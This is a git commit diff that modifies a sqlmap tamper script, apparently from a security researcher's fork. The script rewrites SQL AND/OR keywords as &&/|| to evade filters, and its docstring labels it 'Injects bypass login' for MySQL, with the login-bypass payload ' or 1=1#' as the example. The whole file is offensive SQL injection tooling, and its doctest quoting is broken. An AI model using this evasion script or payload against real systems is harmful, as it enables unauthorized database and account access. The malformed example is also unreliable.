d666133fe9dc479b3ef4f7b20e8944e9c0cef9ab
nu11secur1ty <venvaropt@gmail.com>
2023-12-17 10:32:30 +0200

    bypass-tamper-0.4/12/17/23
    bypass-tamper-0.4/12/17/23

--- tools/tamper-nu11secur1ty/bypass.py
+++ tools/tamper-nu11secur1ty/bypass.py
@@ -4,19 +4,30 @@
 Copyright (c) 2006-2023 nu11secur1ty (https://sqlmap.org/)
 See the file 'LICENSE' for copying permission
 """
-
-from lib.core.enums import PRIORITY
 import re
-__priority__ = PRIORITY.NORMAL
+from lib.core.data import kb
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.HIGHEST
+
 def dependencies():
     pass
+
 def tamper(payload, **kwargs):
-"""
-Replace OR and AND keywords with || and &&
->>> tamper('nu11secur1ty' or 1=1#)
-' || nu11secur1ty' or 1=1#
-"""
-    retVal = ""
-    retVal = re.sub('\\bOR\\b', '||', payload)
-    retVal = re.sub('\\bAND\\b', '&&', retVal)
+    """
+    Injects bypass login
+
+    Requirement:
+        * MySQL
+
+    >>> tamper('nu11secur1ty' or 1=1#')
+    """
+
+    retVal = payload
+
+    if payload:
+        retVal = re.sub('\\bAND\\b', '&&', retVal)
+        retVal = re.sub('\\bOR\\b', '||', retVal)
+
     return retVal
+
